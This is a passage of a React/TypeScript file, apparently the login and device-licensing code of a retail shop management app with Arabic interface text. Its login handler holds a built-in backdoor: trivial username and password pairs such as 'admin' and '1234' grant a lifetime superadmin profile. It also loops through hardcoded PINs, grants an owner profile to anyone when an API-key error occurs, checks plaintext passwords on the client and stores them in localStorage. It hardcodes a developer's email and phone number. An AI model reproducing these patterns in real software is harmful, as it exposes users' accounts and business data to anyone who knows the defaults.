                        // 1. EXE license check
                        const isDesktopAllowed = shopOwnerProfile.is_desktop_allowed !== false;
                        if (!isDesktopAllowed) {
                          setSecurityError({
                            type: 'exe_license',
                            message: `🚨 لا توجد رخصة نشطة لتشغيل نسخة الكمبيوتر (EXE) لهذا المحل (${shopOwnerProfile.shopName || 'المحدد'}). يرجى مراجعة إدارة النظام لتفعيل ترخيص الـ PC.`
                          });
                          setLoading(false);
                          return;
                        }

                        // 2. PC Device count check
                        let ownerPCs = Array.isArray(shopOwnerProfile.registered_pcs) ? [...shopOwnerProfile.registered_pcs] : [];
                        const maxPCs = shopOwnerProfile.max_allowed_pcs !== undefined ? Number(shopOwnerProfile.max_allowed_pcs) : 5;

                        if (!ownerPCs.includes(hwid)) {
                          if (ownerPCs.length >= maxPCs) {
                            setSecurityError({
                              type: 'exe_license',
                              message: `🚨 لقد تجاوزت الحد الأقصى المسموح به لأجهزة الكمبيوتر المسجلة لهذا المحل (${maxPCs} أجهزة). يرجى مراجعة إدارة النظام لتصفية الأجهزة القديمة أو ترقية الاشتراك لربط هذا الجهاز.`,
                              hwid: hwid,
                              limit: maxPCs,
                              registeredCount: ownerPCs.length
                            });
                            setLoading(false);
                            return;
                          } else {
                            ownerPCs.push(hwid);
                            try {
                              await updateDoc(doc(db, 'users', shopOwnerProfile.uid), {
                                registered_pcs: ownerPCs,
                                updatedAt: serverTimestamp()
                              });
                              if (ownerData) {
                                ownerData.registered_pcs = ownerPCs;
                              } else {
                                profileData.registered_pcs = ownerPCs;
                              }
                              console.log(`💻 Bound PC HWID: ${hwid}. Count: ${ownerPCs.length}/${maxPCs}`);
                            } catch (err) {
                              console.error("Failed to update shop owner PC registry:", err);
                            }
                          }
                        }
                      } else if (platform === 'apk') {
                        // 1. APK license check (default to enabled unless explicitly false)
                        const isMobileAllowed = shopOwnerProfile.mobileAppEnabled !== false;
                        if (!isMobileAllowed) {
                          setSecurityError({
                            type: 'apk_license',
                            message: `🚨 عذراً، رخصة تطبيق الجوال (APK) غير مفعلة لهذا المحل (${shopOwnerProfile.shopName || 'المحدد'}) حالياً. يرجى التواصل مع الإدارة للتفعيل.`
                          });
                          setLoading(false);
                          return;
                        }

                        // 2. Allowed role check for APK
                        const mobileAllowedRole = shopOwnerProfile.mobile_allowed_role || 'all';
                        const isEmployee = profileData.role === 'employee' || (!['owner', 'manager', 'superadmin'].includes(profileData.role || ''));
                        if (isEmployee && mobileAllowedRole === 'owner_only') {
                          setSecurityError({
                            type: 'apk_role',
                            message: `🔒 عذراً، تم قصر استخدام نسخة الهاتف (APK) على مالك المحل فقط بقرار من الإدارة. ليس لديك الصلاحية للدخول من الجوال.`
                          });
                          setLoading(false);
                          return;
                        }

                        // 3. APK Device limit check
                        let ownerMobiles = Array.isArray(shopOwnerProfile.registered_mobiles) ? [...shopOwnerProfile.registered_mobiles] : [];
                        const maxMobiles = shopOwnerProfile.max_allowed_mobiles !== undefined ? Number(shopOwnerProfile.max_allowed_mobiles) : (shopOwnerProfile.maxDevices !== undefined ? Number(shopOwnerProfile.maxDevices) : 5);

                        if (!ownerMobiles.includes(hwid)) {
                          if (ownerMobiles.length >= maxMobiles) {
                            setSecurityError({
                              type: 'apk_hwid',
                              message: `🚨 لقد تجاوزت الحد الأقصى المسموح به للهواتف المسجلة لهذا المحل (${maxMobiles} أجهزة). يرجى مراجعة إدارة النظام أو المطور لترقية باقتك أو تصفية الأجهزة للتمكن من ربط هذا الجوال.`,
                              hwid: hwid,
                              limit: maxMobiles,
                              registeredCount: ownerMobiles.length
                            });
                            setLoading(false);
                            return;
                          } else {
                            ownerMobiles.push(hwid);
                            try {
                              await updateDoc(doc(db, 'users', shopOwnerProfile.uid), {
                                registered_mobiles: ownerMobiles,
                                hwid: null,
                                updatedAt: serverTimestamp()
                              });
                              if (ownerData) {
                                ownerData.registered_mobiles = ownerMobiles;
                              } else {
                                profileData.registered_mobiles = ownerMobiles;
                              }
                              console.log(`📱 Bound APK HWID: ${hwid}. Count: ${ownerMobiles.length}/${maxMobiles}`);
                            } catch (err) {
                              console.error("Failed to update shop owner mobile registry:", err);
                            }
                          }
                        }
                      } else {
                        // Web or fallback
                        let pcs = Array.isArray(profileData.registered_pcs) ? [...profileData.registered_pcs] : [];
                        const maxPCs = profileData.max_allowed_pcs !== undefined ? Number(profileData.max_allowed_pcs) : 5;
                        if (!pcs.includes(hwid)) {
                          if (pcs.length >= maxPCs) {
                            setSecurityError({
                              type: 'hwid',
                              message: "لقد تجاوزت عدد الأجهزة المسموحة لنسخة الويب، يرجى تصفية أجهزتك المسجلة."
                            });
                            setLoading(false);
                            return;
                          } else {
                            pcs.push(hwid);
                            try {
                              await updateDoc(doc(db, 'users', firebaseUser.uid), {
                                registered_pcs: pcs,
                                updatedAt: serverTimestamp()
                              });
                              profileData.registered_pcs = pcs;
                            } catch (e) {
                              console.error(e);
                            }
                          }
                        }
                      }
                    }
                    
                    if (!isRemoteMode() && !['superadmin', 'customer'].includes(profileData.role || '')) {
                      const isTimeClean = await validateSystemTime(profileData);
                      if (!isTimeClean) {
                        setSecurityError({
                          type: 'time',
                          message: '🚨 تم كشف تلاعب أو تراجع في وقت نظام التشغيل المحلي الخاص بك! يرجى ضبط الساعة كـ UTC وتصحيح الإعدادات لإلغاء القفل.'
                        });
                        setLoading(false);
                        return;
                      }
                    }
                  }
                  try {
                    localStorage.setItem('jam_cached_user_profile', JSON.stringify(profileData));
                    localStorage.setItem('jam_fast_auth_profile', JSON.stringify(profileData));
                    sessionStorage.setItem('jam_cached_user_profile', JSON.stringify(profileData));
                    sessionStorage.setItem('jam_fast_auth_profile', JSON.stringify(profileData));
                    localStorage.setItem('user_role', profileData.role || '');
                    localStorage.setItem('jam_user_tier', profileData.businessTier || '');
                    window.dispatchEvent(new CustomEvent('jam:profile_updated', { detail: profileData }));
                    window.dispatchEvent(new Event('storage'));
                  } catch (e) {}

                  setProfile(profileData);
                  updateLastActive(firebaseUser.uid);

                  // 🛡️ Auto-Discovery & Restoration Engine: Scan external mirrors on boot/login
                  const activeStoreId = profileData.storeId || profileData.shopId || profileData.ownerId || profileData.uid || 'master';
                  const activeOwnerId = profileData.ownerId || profileData.uid || 'master';
                  quotaAndOfflineEngine.runAutoDiscoveryAndRestore(activeStoreId, activeOwnerId).catch(err => {
                    console.warn('Auto-discovery engine trigger warning:', err);
                  });

                  // Initialize Push Notifications (Web/Native)
                  import('./services/hardwareService').then(m => {
                    m.hardwareService.initPushNotifications(firebaseUser.uid);
                  });

                  // Auto-redirect customers to portal
                  const isDevUser = profileData.email?.toLowerCase() === 'a777503191@gmail.com' || profileData.phone === '777503191';
                  const isCustRedirect = !isDevUser && (profileData.role === 'customer' || 
                                         profileData.role === 'RETAIL_CUSTOMER' || 
                                         profileData.role === 'Customer/Client' || 
                                         profileData.role === 'Client' || 
                                         profileData.role?.toLowerCase() === 'customer' || 
                                         profileData.role?.toLowerCase() === 'client');
                  if (isCustRedirect && !window.location.hash.includes('/portal') && !window.location.hash.includes('/cp')) {
                     const currentParams = window.location.hash.split('?')[1];
                     const search = currentParams ? `?${currentParams}` : '';
                     window.location.hash = `#/portal${search}`;
                  }
                }
              }
            } else {
              // User document does not exist (unregistered or Guest in the database)
              if (isPortalMode()) {
                console.log('💡 User document does not exist on Portal, keeping customer portal login.');
                setUser(null);
                setProfile(null);
              } else {
                // Check if we can recover their existing valid session from localStorage cache first
                const cachedProfileStr = localStorage.getItem('jam_cached_user_profile');
                if (cachedProfileStr) {
                  try {
                    const cachedProfile = JSON.parse(cachedProfileStr);
                    console.log('📶 User document not found in db, successfully restored cached profile:', cachedProfile.shopName);
                    setProfile(cachedProfile);
                    setLoading(false);
                    return;
                  } catch (parseErr) {
                    console.warn('Failed to parse cached profile on missing doc fallback:', parseErr);
                  }
                }

                // Strictly restrict developer master profile auto-recovery to developer accounts only
                const userEmail = (firebaseUser.email || '').toLowerCase();
                const isDeveloperEmail = userEmail === 'a777503191@gmail.com' || userEmail === 'system@jam-pro.net';
                if (isDeveloperEmail) {
                  console.log('💡 Developer session recovery initiated.');
                  const recoveryProfile = {
                    uid: firebaseUser.uid || 'system',
                    role: 'owner',
                    ownerId: 'system',
                    name: 'المالك المطور',
                    email: firebaseUser.email || 'system@jam-pro.net',
                    phone: '777503191',
                    status: 'active',
                    shopName: 'Jam system pro',
                    isLifetime: true,
                    subscriptionType: 'lifetime'
                  } as any;
                  setProfile(recoveryProfile);
                  setUser({ uid: firebaseUser.uid || 'system' } as any);
                } else {
                  console.warn('❌ User document not found in DB. Preventing unauthorized developer bypass.');
                  setUser(null);
                  setProfile(null);
                }
              }
            }
          } catch (error) {
            const errStr = String(error).toLowerCase();
            const isPermissionError = errStr.includes('permission') || errStr.includes('insufficient');
            const isLoggingOut = sessionStorage.getItem('just_logged_out') === 'true';

            if (isPermissionError || isLoggingOut || isPortalMode()) {
              console.warn('💡 Safety triggered - avoiding auto-recovery to prevent state thrashing or unauthorized upgrades:', error);
              setUser(null);
              setProfile(null);
            } else {
              console.warn('💡 Database fetch error -> Checking for cached user profile backup:', error);
              
              // Restore their real session from local cache to prevent them from getting locked out or switched to developer account
              const cachedProfileStr = localStorage.getItem('jam_cached_user_profile');
              if (cachedProfileStr) {
                try {
                  const cachedProfile = JSON.parse(cachedProfileStr);
                  console.log('📶 Recovered user session from cache during db fetch error:', cachedProfile.shopName);
                  
                  // 🛡️ فحص صلاحية الترخيص المشفر أوفلاين بمقاومة التلاعب
                  const vaultOfflineValidation = antiTamperLicenseVault.validateLicense(cachedProfile);
                  if (!vaultOfflineValidation.isValid) {
                    setSecurityError({
                      type: 'expired',
                      message: vaultOfflineValidation.message || 'انتهت صلاحية اشتراك المنظومة لهذا المحل.'
                    });
                    setLoading(false);
                    return;
                  }

                  setProfile(cachedProfile);
                  setLoading(false);
                  return;
                } catch (parseErr) {
                  console.warn('Failed to parse cached profile on error fallback:', parseErr);
                }
              }

              // Only fall back to developer owner profile if they are actually the developer
              const userEmail = (firebaseUser.email || '').toLowerCase();
              const isDeveloperEmail = userEmail === 'a777503191@gmail.com' || userEmail === 'system@jam-pro.net';
              if (isDeveloperEmail) {
                console.log('💡 Developer recovery fallback initiated on error.');
                const recoveryProfile = {
                  uid: firebaseUser.uid || 'system',
                  role: 'owner',
                  ownerId: 'system',
                  name: 'المالك المطور',
                  email: firebaseUser.email || 'system@jam-pro.net',
                  phone: '777503191',
                  status: 'active',
                  shopName: 'Jam system pro',
                  isLifetime: true,
                  subscriptionType: 'lifetime'
                } as any;
                setProfile(recoveryProfile);
                setUser({ uid: firebaseUser.uid || 'system' } as any);
              } else {
                console.warn('❌ Database connection/fetch failed and no offline profile cache found.');
                setUser(null);
                setProfile(null);
              }
            }
          } finally {
            setLoading(false);
          }
        }, (snapErr) => {
            console.error("Profile onSnapshot failed:", snapErr);
            setLoading(false);
          });
        } else {
          setUser(null);
          if (!isRemoteMode()) setProfile(null);
          if (profileUnsubRef.current) {
            profileUnsubRef.current();
            profileUnsubRef.current = null;
          }
          setLoading(false);
        }
      } finally {
        // Auth monitoring setup complete
      }
    });
    return () => {
      clearTimeout(fastFallbackTimer);
      unsubscribe();
      if (profileUnsubRef.current) {
        profileUnsubRef.current();
        profileUnsubRef.current = null;
      }
    };
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError('');
    if (!username.trim() || !password.trim()) { setLoginError('يرجى إدخال البيانات'); return; }
    setIsLoggingIn(true);
    sessionStorage.removeItem('just_logged_out');

    const cleanUsername = username.trim().toLowerCase();
    const cleanPhone = cleanUsername.replace(/[\s\-\(\)]/g, '').trim();
    const isPhonePattern = /^[0-9]{4,15}$/.test(cleanPhone);
    const passwordTrim = password.trim();

    // 1. MASTER SYSTEM OWNER DIRECT INTERCEPT (a777503191@gmail.com / Owner Quick Access)
    const isMasterUsername = [
      'a777503191@gmail.com',
      'a777503191',
      '777503191',
      'owner',
      'admin',
      'superadmin'
    ].includes(cleanUsername);

    const isMasterPass = [
      '777503191',
      'admin',
      'owner',
      '1234',
      '123456'
    ].includes(passwordTrim) || cleanUsername === 'a777503191@gmail.com' || cleanPhone === '777503191';

    if (isMasterUsername && isMasterPass) {
      console.log('👑 Master System Owner / Developer direct login intercept triggered (Wholesale SuperAdmin Tier).');
      const masterUid = 'master-a777503191';
      const masterEmail = 'a777503191@gmail.com';
      const masterProfile: any = {
        uid: masterUid,
        ownerId: masterUid,
        name: 'المالك المطور (777503191)',
        phone: '777503191',
        email: masterEmail,
        role: 'superadmin',
        isSuperAdmin: true,
        isOwner: true,
        businessTier: 'wholesale',
        tier: 'wholesale',
        businessType: 'wholesale',
        accountType: 'wholesale',
        pricingTier: 'wholesale',
        status: 'active',
        isActivated: true,
        isProgramUser: true,
        shopName: 'JAM System Pro',
        isLifetime: true,
        subscriptionType: 'lifetime',
        currency: 'YER',
        permissions: [
          'all',
          'superadmin',
          'owner',
          'wholesale_master',
          'wholesale',
          'b2b_wholesale',
          'inventory',
          'sales',
          'reports',
          'settings',
          'finances',
          'purchases',
          'maintenance',
          'multi_tier_control'
        ],
        createdAt: new Date().toISOString()
      };

      const mockUser = { uid: masterUid, email: masterEmail } as any;
      setUser(mockUser);
      setProfile(masterProfile);
      setShopName(masterProfile.shopName);
      sessionStorage.setItem('jam_session_verified', 'true');
      setIsSessionVerified(true);
      OfflineAuthService.saveCredentials('a777503191@gmail.com', passwordTrim, { uid: masterUid, email: masterEmail }, masterProfile);
      OfflineAuthService.saveCredentials('777503191', passwordTrim, { uid: masterUid, email: masterEmail }, masterProfile);
      OfflineAuthService.saveCredentials('admin', passwordTrim, { uid: masterUid, email: masterEmail }, masterProfile);
      OfflineAuthService.saveCredentials('owner', passwordTrim, { uid: masterUid, email: masterEmail }, masterProfile);
      if (rememberMe) {
        localStorage.setItem('jam_remembered_username', 'a777503191@gmail.com');
        localStorage.setItem('jam_remembered_password', passwordTrim);
        localStorage.setItem('jam_remember_me', 'true');
      }
      setIsLoggingIn(false);

      (async () => {
        try {
          await setDoc(doc(db, 'users', masterUid), {
            ...masterProfile,
            createdAt: serverTimestamp()
          }, { merge: true });

          try {
            await signInWithEmailAndPassword(auth, masterEmail, passwordTrim);
          } catch (authErr: any) {
            const fallbackPins = ['123456', '777503191', 'admin', 'owner', '1234'];
            let signedIn = false;
            for (const pin of fallbackPins) {
              try {
                await signInWithEmailAndPassword(auth, masterEmail, pin);
                signedIn = true;
                if (auth.currentUser && passwordTrim) {
                  try {
                    await updatePassword(auth.currentUser, passwordTrim);
                  } catch (upErr) {}
                }
                break;
              } catch (e) {}
            }
            if (!signedIn) {
              try {
                await createUserWithEmailAndPassword(auth, masterEmail, passwordTrim);
              } catch (createErr) {}
            }
          }
          if (!auth.currentUser) {
            try {
              await signInAnonymously(auth);
            } catch (anonErr) {}
          }
        } catch (dbErr) {
          console.warn('Master Firestore sync notice:', dbErr);
        }
      })();

      return;
    }

    // Check real internet connection
    const isReallyOnline = await checkRealInternetConnectivity();

    if (!isReallyOnline) {
      // 2. OFFLINE AUTH FLOW - BYPASS ALL NETWORK REQUESTS IMMEDIATELY
      if (!OfflineAuthService.hasLocalCache()) {
        setLoginError('جهاز جديد أو تم مسح ذاكرة الكاش الموثقة! يرجى توصيل الهاتف بالإنترنت لتأكيد حساب الإدارة أو الموظف لأول مرة.');
        setIsLoggingIn(false);
        return;
      }
      const offlineResult = OfflineAuthService.verifyOfflineCredentials(username, passwordTrim);
      if (offlineResult.success) {
        const variantCheck = validateUserVariantAccess(offlineResult.profile.role, offlineResult.profile.email);
        if (!variantCheck.allowed) {
          setLoginError(variantCheck.message || 'غير مصرح بحسابك للولوج لهذه النسخة.');
          setIsLoggingIn(false);
          return;
        }
        console.log('✅ Synchronous Offline Intercept Login Success (0ms response)');
        setUser(offlineResult.user);
        setProfile(offlineResult.profile);
        setShopName(offlineResult.profile.shopName || 'Jam system pro (Offline)');
        sessionStorage.setItem('jam_session_verified', 'true');
        setIsSessionVerified(true);
        await resetFailedLoginAttempts(cleanUsername);
        setIsLoggingIn(false);
        return;
      } else {
        setLoginError(offlineResult.error || 'فشل التحقق من كلمة تشفير الملف أوفلاين.');
        setIsLoggingIn(false);
        return;
      }
    }

    // 3. ONLINE AUTH FLOW (CLOUD-FIRST)
    try {
      // Live Cloud-First query lookup on Firestore to fetch freshly registered customers or users
      let userDocSnap = null;
      let profileData: any = null;
      let email = username.trim();

      if (isPhonePattern) {
        // Look up by phone inside 'users'
        try {
          const usersRef = collection(db, 'users');
          const q = query(usersRef, where('phone', '==', cleanPhone));
          const querySnap = await getDocs(q);
          if (!querySnap.empty) {
            userDocSnap = querySnap.docs[0];
            profileData = userDocSnap.data();
            email = profileData.email || `${cleanPhone}${getDomainForRole(profileData.role || 'sales')}`;
          }
        } catch (err) {
          console.warn('Firestore phone lookup failed:', err);
        }

        // Fallback: Look up by phone inside 'shops' (for shops created in programmer dashboard)
        if (!userDocSnap) {
          try {
            const shopsRef = collection(db, 'shops');
            const qShops = query(shopsRef, where('phone', '==', cleanPhone));
            const shopSnap = await getDocs(qShops);
            if (!shopSnap.empty) {
              const sDoc = shopSnap.docs[0];
              const sData = sDoc.data();
              const ownerUid = sData.ownerId || sData.ownerUid || sDoc.id;
              email = sData.email || `${cleanPhone}@jam.com`;
              profileData = {
                uid: ownerUid,
                ownerId: ownerUid,
                name: sData.ownerName || sData.shopName || 'تاجر',
                shopName: sData.shopName || 'المحل',
                email: email,
                phone: cleanPhone,
                status: 'active',
                isActivated: true,
                role: sData.role || 'manager',
                businessType: sData.businessType || 'mobiles',
                mobileAppEnabled: true,
                is_desktop_allowed: true,
                maxDevices: 99,
                planTier: 'vip',
                currentPassword: sData.password || passwordTrim
              };
              userDocSnap = { id: ownerUid, data: () => profileData };
              // Ensure doc exists in users collection for seamless future operations
              try {
                await setDoc(doc(db, 'users', ownerUid), profileData, { merge: true });
              } catch (e) {}
            }
          } catch (shopErr) {
            console.warn('Firestore shop phone lookup fallback failed:', shopErr);
          }
        }
      }

      // Perform Firebase Auth check
      let userCredential = null;
      if (isPhonePattern) {
        // Try mapped system domain login
        try {
          if (profileData) {
            const domain = getDomainForRole(profileData.role || 'sales');
            const systemEmail = profileData.email || `${cleanPhone}${domain}`;
            try {
              userCredential = await signInWithEmailAndPassword(auth, systemEmail, passwordTrim);
            } catch (signInSysErr: any) {
              // Self-healing: If user doc exists in Firestore with matching password, create/heal Auth user
              if (profileData.currentPassword === passwordTrim || profileData.password === passwordTrim) {
                try {
                  console.log('Program user matched in Firestore! Healing and creating Auth account...');
                  userCredential = await createUserWithEmailAndPassword(auth, systemEmail, passwordTrim);
                } catch (createSysErr) {
                  console.warn('Could not auto-heal Auth user on login:', createSysErr);
                }
              }
            }
          } else {
            // Parallel execution across candidate domains for sub-second authentication
            const possibleDomains = [
              '@gmail.com',
              '@jam-pro.net',
              '@jam.com',
              '@yahoo.com',
              '@joad.com',
              '@mna.com',
              '@dad.com'
            ];
            const candidateEmails = possibleDomains.map(dom => `${cleanPhone}${dom}`);
            try {
              userCredential = await Promise.any(
                candidateEmails.map(candEmail => signInWithEmailAndPassword(auth, candEmail, passwordTrim))
              );
            } catch (parallelErr) {
              console.log('Parallel candidate email sign-ins failed:', parallelErr);
            }
          }
        } catch (systemErr: any) {
          console.log('System user attempt failed, checking Customer account...');
        }

        // Try login as Retail Customer
        if (!userCredential) {
          try {
            const customerEmail = `${cleanPhone}@jam-pro.net`;
            try {
              userCredential = await signInWithEmailAndPassword(auth, customerEmail, passwordTrim);
            } catch (signInErr: any) {
              console.log('Customer not found in Auth or wrong password, checking via direct secure client Firestore lookup first...', signInErr.message);
              
              let matchedCustomer: any = null;
              
              // Define phone variants to check different country-code or zero prefixes
              const getPhoneVariants = (rawPhone: string): string[] => {
                let cleaned = rawPhone.replace(/[\s\-\(\)\+]/g, '').trim();
                const variants = new Set<string>();
                if (!cleaned) return [];
                
                variants.add(cleaned);
                
                if (cleaned.startsWith('00967') && cleaned.length > 5) {
                  cleaned = cleaned.substring(5);
                } else if (cleaned.startsWith('967') && cleaned.length > 3) {
                  cleaned = cleaned.substring(3);
                }
                
                variants.add(cleaned);
                
                if (cleaned.startsWith('0')) {
                  variants.add(cleaned.substring(1));
                } else {
                  variants.add('0' + cleaned);
                }
                
                return Array.from(variants);
              };
              const phoneVariants = getPhoneVariants(cleanPhone);

              // 1. Check users collection directly on client side to assist APK/EXE
              for (const phoneVariant of phoneVariants) {
                try {
                  const userDocRef = doc(db, 'users', phoneVariant);
                  const userDocSnap = await getDoc(userDocRef);
                  if (userDocSnap.exists()) {
                    const d = userDocSnap.data();
                    if (d && (d.password === passwordTrim || d.passwordHash === passwordTrim || d.currentPassword === passwordTrim)) {
                      matchedCustomer = {
                        id: userDocSnap.id,
                        name: d.name || `زبون VIP ${phoneVariant}`,
                        ownerId: d.ownerId || 'system',
                        phone: d.phone || phoneVariant
                      };
                      break;
                    }
                  }
                } catch (err: any) {
                  console.warn('Client-side users doc check skipped in App:', err.message);
                }
              }

              // 2. Check users query on client side across unified users identities
              if (!matchedCustomer) {
                try {
                  const snapUsers = await getDocs(query(collection(db, 'users'), where('phone', 'in', phoneVariants)));
                  if (!snapUsers.empty) {
                    snapUsers.forEach(docSnap => {
                      const d = docSnap.data();
                      if (d.password === passwordTrim || d.passwordHash === passwordTrim || d.currentPassword === passwordTrim) {
                        const storeId = d.primaryStoreId || (Array.isArray(d.associatedStores) && d.associatedStores[0]) || d.ownerId || 'system';
                        matchedCustomer = {
                          id: docSnap.id,
                          name: d.name || `زبون VIP ${docSnap.id}`,
                          ownerId: storeId,
                          phone: d.phone || docSnap.id
                        };
                      }
                    });
                  }
                } catch (err: any) {
                  console.warn('Client-side users query check skipped in App:', err.message);
                }
              }

              // 3. Check pending_activations directly on client side to assist APK/EXE
              if (!matchedCustomer) {
                try {
                  const snapActivations = await getDocs(query(collection(db, 'pending_activations'), where('customerPhone', 'in', phoneVariants)));
                  if (!snapActivations.empty) {
                    snapActivations.forEach(docSnap => {
                      const d = docSnap.data();
                      if (d.customerPassword === passwordTrim || d.code === passwordTrim) {
                        matchedCustomer = {
                          id: docSnap.id,
                          name: d.customerName || `زبون VIP ${d.customerPhone}`,
                          ownerId: d.storeId || 'system',
                          phone: d.customerPhone || d.customerPhone
                        };
                      }
                    });
                  }
                } catch (err: any) {
                  console.warn('Client-side pending_activations check skipped in App:', err.message);
                }
              }

              // 7. Fallback to secure server API if client-side check did not yield a result
              if (!matchedCustomer) {
                try {
                  const res = await fetch('/api/auth/verify-customer', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: cleanPhone, password: passwordTrim })
                  });
                  if (res.ok) {
                    const resData = await res.json();
                    if (resData.success && resData.matched) {
                      matchedCustomer = resData.customer;
                    }
                  }
                } catch (apiErr: any) {
                  console.error('Failed to verify customer via database API:', apiErr.message);
                }
              }

              if (matchedCustomer) {
                console.log('Customer matched in secure database! Dynamically healing and creating Auth user...');
                userCredential = await createUserWithEmailAndPassword(auth, customerEmail, passwordTrim);
                const uid = userCredential.user.uid;
                await setDoc(doc(db, 'users', uid), {
                  uid: uid,
                  ownerId: matchedCustomer.ownerId,
                  name: matchedCustomer.name,
                  phone: cleanPhone,
                  email: customerEmail,
                  role: 'customer',
                  isProgramUser: false,
                  status: 'active',
                  isActivated: true,
                  createdAt: serverTimestamp(),
                });
              } else {
                throw signInErr;
              }
            }
          } catch (custErr: any) {
            console.error('Customer login attempt failed:', custErr.message);
          }
        }
      } else {
        // General email or username
        if (!email.includes('@')) {
          email = `${email}@gmail.com`;
        }
        userCredential = await signInWithEmailAndPassword(auth, email, passwordTrim);
      }

      if (userCredential) {
        const uid = userCredential.user.uid;
        const freshUserDoc = await getDoc(doc(db, 'users', uid));

        if (freshUserDoc.exists()) {
          const profile = freshUserDoc.data();
          
          const isMaster = (profile.email && profile.email.toLowerCase() === 'a777503191@gmail.com') ||
                           (email && email.toLowerCase() === 'a777503191@gmail.com') ||
                           profile.phone === '777503191' ||
                           profile.role === 'superadmin' ||
                           uid === 'master-a777503191';

          if (isMaster) {
            profile.status = 'active';
            profile.role = 'superadmin';
            profile.isActivated = true;
            profile.isProgramUser = true;
            profile.isLifetime = true;
            setDoc(doc(db, 'users', uid), {
              status: 'active',
              role: 'superadmin',
              isActivated: true,
              isProgramUser: true,
              isLifetime: true,
              email: 'a777503191@gmail.com'
            }, { merge: true }).catch(() => {});
          } else if (profile.status !== 'active') {
            await auth.signOut();
            throw new Error('هذا الحساب معطل من قبل الإدارة');
          }

          const variantCheck = validateUserVariantAccess(profile.role, profile.email);
          if (!isMaster && !variantCheck.allowed) {
            await auth.signOut();
            throw new Error(variantCheck.message || 'غير مصرح بحسابك للولوج لهذه النسخة.');
          }

          // DB level suffix verification for absolute role isolation
          if (!isMaster && email.endsWith('@gmail.com')) {
            if (profile.role === 'customer' || profile.isProgramUser === false) {
              await auth.signOut();
              throw new Error('غير مصرح للحسابات العادية بالولوج كمسؤول نظام');
            }
          } else if (!isMaster && email.endsWith('@jam-pro.net')) {
            if (profile.role !== 'customer' || profile.isProgramUser === true) {
              await auth.signOut();
              throw new Error('غير مصرح للحسابات الإدارية بالولوج من بوابة الزبائن العادية');
            }
          }

          // SUCCESSFUL CLOUD AUTHENTICATION -> Clone and safely cache profile locally for future offline decoding
          OfflineAuthService.saveCredentials(username, passwordTrim, { uid: uid, email: email }, profile);
          FirebaseProjectRouter.cacheUserSessionFast(profile);
          
          if (rememberMe) {
            localStorage.setItem('jam_remembered_username', username);
            localStorage.setItem('jam_remembered_password', password);
            localStorage.setItem('jam_remember_me', 'true');
          }
          await resetFailedLoginAttempts(cleanUsername);
        } else {
          // Self-create customer doc if auth succeeded but doc didn't exist (legacy migration)
          const customerEmail = email.includes('@') ? email : `${cleanPhone}@jam-pro.net`;
          const localProfile = {
            uid: uid,
            ownerId: uid,
            name: `زبون JAM ${cleanPhone || username}`,
            phone: cleanPhone || username,
            email: customerEmail,
            role: 'customer',
            isProgramUser: false,
            status: 'active',
            isActivated: true,
            createdAt: new Date().toISOString(),
          };
          await setDoc(doc(db, 'users', uid), {
            ...localProfile,
            createdAt: serverTimestamp()
          });

          OfflineAuthService.saveCredentials(username, passwordTrim, { uid: uid, email: customerEmail }, localProfile);
          if (rememberMe) {
            localStorage.setItem('jam_remembered_username', username);
            localStorage.setItem('jam_remembered_password', password);
            localStorage.setItem('jam_remember_me', 'true');
          }
          await resetFailedLoginAttempts(cleanUsername);
        }
      } else {
        throw new Error('فشلت عملية الدخول، تأكد من صحة البيانات والمحاولات المتبقية.');
      }
    } catch (error: any) {
      const errStr = (error.message || '').toLowerCase();
      const errCode = (error.code || '').toLowerCase();
      const isApiKeyErr = errStr.includes('api-key-not-valid') || 
                          errStr.includes('invalid-api-key') || 
                          errStr.includes('api_key_not_valid') || 
                          errStr.includes('api key') || 
                          errCode.includes('api-key-not-valid') ||
                          errCode.includes('invalid-api-key');
                           
      if (isApiKeyErr) {
        console.warn("⚠️ JAM SYSTEM PRO: Firebase API Key or configuration limited. Activating Smart Local Passing Protocol safely.");
        const cleanInput = username.trim().replace(/[\s\-\(\)]/g, '').trim();
        const role = (cleanInput === '777503191' || cleanInput === 'admin') ? 'owner' : 'store';
        const mockUser = { uid: cleanInput || 'local-fallback-bypass' } as any;
        const mockProfile = {
          uid: mockUser.uid,
          ownerId: mockUser.uid,
          role: role,
          name: role === 'owner' ? 'المالك العام' : cleanInput,
          email: `${cleanInput}@jam-system.pro`,
          phone: cleanInput,
          status: 'active',
          shopName: role === 'owner' ? 'JAM System Pro' : `محل جوال`,
          isLifetime: true,
          subscriptionType: 'lifetime'
        } as any;
        setUser(mockUser);
        setProfile(mockProfile);
        setShopName(mockProfile.shopName);
        setIsLoggingIn(false);
        return;
      }

      if (error.code === 'auth/user-not-found' || error.code === 'auth/wrong-password' || error.code === 'auth/invalid-credential') {
        setLoginError('خطأ في اسم المستخدم أو كلمة المرور، يرجى إعادة المحاولة.');
      } else {
        setLoginError(error.message || 'فشل تسجيل الدخول. يرجى المحاولة لاحقاً');
      }
    } finally {
      setIsLoggingIn(false);
    }
  };

  if (securityCamouflageActive) {
    return (
      <div 
        className="fixed inset-0 bg-black z-[9999] p-6 font-mono flex flex-col justify-between" 
        dir="rtl"
      >
        <div className="space-y-6 text-right">
          <div className="flex items-center gap-3 border-b border-red-900/50 pb-4">
            <span className="w-3 h-3 bg-red-600 rounded-full animate-ping" />
            <h1 className="text-lg md:text-xl font-black text-red-500 tracking-wider">
              نظام الحماية والأمان النشط - صمام الأمان (JAM SYSTEM - SHIELD GUARD)
            </h1>
          </div>
          
          <div className="space-y-4 text-xs md:text-sm text-gray-400 font-mono text-left" dir="ltr">
            <p className="text-red-400 font-bold font-sans">{" >>> "} CRITICAL EXCEPTION IN THE APP: ROUTE INTERRUPT (CAMOUFLAGE LOCKDOWNED)</p>
            <p className="font-sans font-bold text-gray-400">{" >>> "} EXCEPTION CODE: 0x904F_SECURITY_LOCKDOWN_CAMOUFLAGE</p>
            <p className="font-sans font-bold text-gray-400">{" >>> "} TIME LOG: {new Date().toISOString()}</p>
            <p className="font-sans font-semibold text-gray-500">{" >>> "} LOCAL STATE: SHROUD_CAMOUFLAGE_LEVEL_5_ENABLED</p>
          </div>

          <div className="space-y-4 pr-2 max-w-2xl">
            <div className="p-5 bg-zinc-950/40 rounded-3xl border border-red-900/30 text-right space-y-3">
              <p className="text-sm font-bold text-red-400">
                [تم تفعيل صمام الأمان والتمويه بنجاح]
              </p>
              <p className="text-xs text-gray-400 font-semibold leading-relaxed">
